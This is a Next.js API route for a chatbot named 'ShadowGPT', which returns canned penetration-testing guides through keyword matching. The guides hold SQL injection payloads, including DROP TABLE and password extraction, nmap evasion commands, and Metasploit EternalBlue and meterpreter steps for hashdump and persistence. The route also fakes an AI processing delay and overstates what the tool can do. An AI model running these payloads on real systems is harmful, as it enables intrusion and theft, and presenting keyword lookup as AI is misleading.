import { NextResponse } from 'next/server';

// Enhanced knowledge base for ShadowGPT v2.0
const pentestingKnowledge = {
  "sql injection": `🔍 **SQL INJECTION - COMPREHENSIVE GUIDE**

**Definition:** SQL Injection is a web security vulnerability that allows attackers to interfere with database queries.

**Types:**
• Classic SQLi
• Blind SQLi
• Boolean-based Blind
• Time-based Blind
• Out-of-band SQLi

**Testing Methodology:**
1. Identify injection points
2. Test with basic payloads: ' OR 1=1 --
3. Determine database type
4. Extract database structure
5. Retrieve sensitive data

**Advanced Payloads:**
\`\`\`sql
' UNION SELECT username, password FROM users--
'; DROP TABLE users-- 
' OR '1'='1
' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a
\`\`\`

**Prevention:**
• Use parameterized queries
• Implement input validation
• Use ORM frameworks
• Apply principle of least privilege
• Regular security testing

**Tools:** SQLmap, Burp Suite, Havij, jSQL Injection`,

  "nmap": `📡 **NMAP - NETWORK MAPPING MASTER**

**Essential Commands:**
\`\`\`bash
# Stealth SYN Scan
nmap -sS 192.168.1.0/24

# Comprehensive Scan
nmap -A -T4 target.com

# Version Detection + OS Fingerprinting
nmap -sV -O target.com

# UDP Services Scan
nmap -sU -p 1-1000 target.com

# Script Scanning
nmap --script vuln target.com
nmap --script http-enum target.com

# Output Formats
nmap -oN output.txt target.com
nmap -oX output.xml target.com
\`\`\`

**Advanced Techniques:**
• Firewall Evasion: \`nmap -f -D RND:10 --data-length 50\`
• Timing Templates: \`-T0\` (paranoid) to \`-T5\` (insane)
• Service Version Detection: \`-sV --version-intensity 9\`
• NSE Script Categories: vuln, discovery, exploit, auth`,

  "metasploit": `⚡ **METASPLOIT FRAMEWORK - EXPLOITATION MASTER**

**Workflow:**
1. Reconnaissance
2. Vulnerability Analysis
3. Exploitation
4. Post-Exploitation
5. Reporting

**Essential Commands:**
\`\`\`bash
msf6 > search eternalblue
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 > show options
msf6 > set RHOSTS 192.168.1.100
msf6 > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 > set LHOST 192.168.1.50
msf6 > exploit

# Meterpreter Essentials
meterpreter > sysinfo
meterpreter > getuid
meterpreter > hashdump
meterpreter > migrate
meterpreter > screenshot
\`\`\`

**Post-Exploitation Modules:**
• Persistence: \`run persistence -U -i 60 -p 443 -r LHOST\`
• Privilege Escalation: \`getsystem\`, \`bypassuac\`
• Lateral Movement: \`psexec\`, \`winrm\``,

  "burp suite": `🌐 **BURP SUITE - WEB APPLICATION TESTING**

**Core Components:**
• **Proxy:** Intercept and modify requests
• **Scanner:** Automated vulnerability detection
• **Intruder:** Customized attack automation
• **Repeater:** Manual request manipulation
• **Sequencer:** Session token analysis

**Testing Methodology:**
1. Configure browser proxy (127.0.0.1:8080)
2. Enable interception
3. Map application structure
4. Identify input vectors
5. Test for common vulnerabilities

**Advanced Techniques:**
• CSRF Token Handling
• Session Management Testing
• Business Logic Flaws
• API Endpoint Testing
• JWT Token Manipulation`,

  "owasp top 10": `🛡️ **OWASP TOP 10 2021 - COMPREHENSIVE**

1. **Broken Access Control**
   - Vertical/horizontal privilege escalation
   - Insecure direct object references

2. **Cryptographic Failures**
   - Weak encryption algorithms
   - Improper key management

3. **Injection**
   - SQL, NoSQL, OS command injection
   - LDAP, XPath injection

4. **Insecure Design**
   - Missing security controls
   - Flawed architecture

5. **Security Misconfiguration**
   - Default configurations
   - Unnecessary features enabled

6. **Vulnerable Components**
   - Known vulnerabilities in dependencies
   - Outdated libraries

7. **Authentication Failures**
   - Weak password policies
   - Session fixation

8. **Software Integrity Failures**
   - CI/CD pipeline vulnerabilities
   - Unverified updates

9. **Security Logging Failures**
   - Missing audit trails
   - Inadequate monitoring

10. **Server-Side Request Forgery**
    - Unvalidated URL fetching
    - Internal service exposure`,

  "web app pentesting": `🎯 **WEB APPLICATION PENETRATION TESTING METHODOLOGY**

**Phase 1: Reconnaissance**
• Subdomain enumeration
• Technology stack identification
• Directory and file discovery

**Phase 2: Scanning**
• Automated vulnerability scanning
• Manual configuration review
• Authentication mechanism testing

**Phase 3: Exploitation**
• Input validation bypass
• Session manipulation
• Business logic exploitation

**Phase 4: Post-Exploitation**
• Data extraction
• Privilege escalation
• Persistence mechanisms

**Essential Tools:**
• OWASP ZAP
• Burp Suite Professional
• Nikto
• Dirb/Dirbuster
• SQLmap
• Commix`,

  "network security": `🔒 **NETWORK SECURITY ASSESSMENT**

**Assessment Layers:**
1. **Network Mapping**
   - Live host discovery
   - Port and service enumeration

2. **Vulnerability Analysis**
   - Service version detection
   - Configuration review

3. **Exploitation**
   - Service-specific attacks
   - Protocol manipulation

4. **Post-Exploitation**
   - Network sniffing
   - Traffic analysis

**Advanced Tools:**
• Nessus/OpenVAS
• Wireshark/Tcpdump
• Aircrack-ng (wireless)
• Responder (LLMNR/NBT-NS)
• Empire/Empire (lateral movement)`,

  "cryptography basics": `🔐 **CRYPTOGRAPHY FUNDAMENTALS**

**Symmetric Encryption:**
• AES (Advanced Encryption Standard)
• DES/3DES (Legacy)
• ChaCha20 (Modern)

**Asymmetric Encryption:**
• RSA (Rivest-Shamir-Adleman)
• ECC (Elliptic Curve Cryptography)
• Diffie-Hellman Key Exchange

**Hashing Algorithms:**
• SHA-256/512 (Secure)
• MD5/SHA-1 (Insecure)
• bcrypt/Argon2 (Password Hashing)

**Key Concepts:**
• Confidentiality - Data secrecy
• Integrity - Data authenticity
• Authentication - Identity verification
• Non-repudiation - Action proof

**Common Vulnerabilities:**
• Weak random number generation
• Improper IV usage
• Padding oracle attacks
• Side-channel attacks`
};

export async function POST(request) {
  try {
    const { message } = await request.json();
    
    if (!message) {
      return NextResponse.json({ error: 'No message provided' }, { status: 400 });
    }

    // Simulate AI processing delay
    await new Promise(resolve => setTimeout(resolve, 800 + Math.random() * 1200));

    const lowerMessage = message.toLowerCase();
    let response = "";
    let topicFound = false;

    // Enhanced topic matching
    for (const [topic, info] of Object.entries(pentestingKnowledge)) {
      if (lowerMessage.includes(topic) || 
          topic.split(' ').some(word => lowerMessage.includes(word))) {
        response = `${info}\n\n---\n*ShadowGPT v2.0 - Created by bedusec*\n*For educational purposes only - Always obtain proper authorization*`;
        topicFound = true;
        break;
      }
    }

    // If no specific topic found, provide advanced general response
    if (!topicFound) {
      response = `🔮 **SHADOWGPT v2.0 - ADVANCED RESPONSE**\n\n**Query Analysis:** "${message}"\n\n**Capabilities Available:**\n\n• **Vulnerability Research** - CVE analysis, exploit development\n• **Tool Mastery** - Nmap, Metasploit, Burp Suite, Wireshark\n• **Methodology Guidance** - PTES, OWASP, NIST frameworks\n• **Code Analysis** - Secure code review, vulnerability detection\n• **Network Security** - Architecture review, hardening guidance\n• **Web Application Security** - OWASP Top 10 mitigation\n• **Social Engineering** - Phishing analysis, awareness training\n• **Digital Forensics** - Incident response, evidence collection\n\n**Please specify:**\n- Particular tool or technique\n- Specific vulnerability type\n- Target environment details\n- Testing constraints/requirements\n\n---\n*Created by **bedusec** - Advanced Pentesting AI*\n*⚠️ Educational Use Only - Ethical Guidelines Enforced*`;
    }

    return NextResponse.json({ response });
  } catch (error) {
    console.error('Error:', error);
    return NextResponse.json(
      { error: 'Internal server error' },
      { status: 500 }
    );
  }
}
